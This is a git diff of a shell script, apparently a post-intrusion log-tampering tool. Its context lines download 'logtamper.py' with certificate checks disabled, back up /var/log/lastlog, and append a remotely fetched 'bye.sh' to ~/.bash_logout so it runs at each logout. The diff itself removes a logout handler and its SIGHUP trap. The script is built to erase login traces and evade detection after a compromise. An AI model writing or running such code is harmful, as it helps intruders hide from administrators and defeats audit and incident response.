@@ -76,10 +76,6 @@ function ByeHack {
   rm $index_f;
   rm $clear_shell;
 }
-exit_session() {
-    gglog "Safe Exit"
-    . "$HOME/.bash_logout"
-}
 
 if [ !  -f $clear_shell ];then
     wget --no-check-certificate  -q -c -t 3  'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O $clear_shell;
@@ -95,7 +91,6 @@ _bak /var/log/lastlog;
 gglog "bak /var/log/"
 
 gglog "${UNDERLINE}ip:$(cat $my_ips | xargs) pts:${my_pts}  ${REST}"
-trap exit_session SIGHUP
 wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout;
 if [ $(( $(cat $my_ips | wc -l ) )) -gt 1 ];then
     gglog "warnning user is logined in !!!! , so exit ";
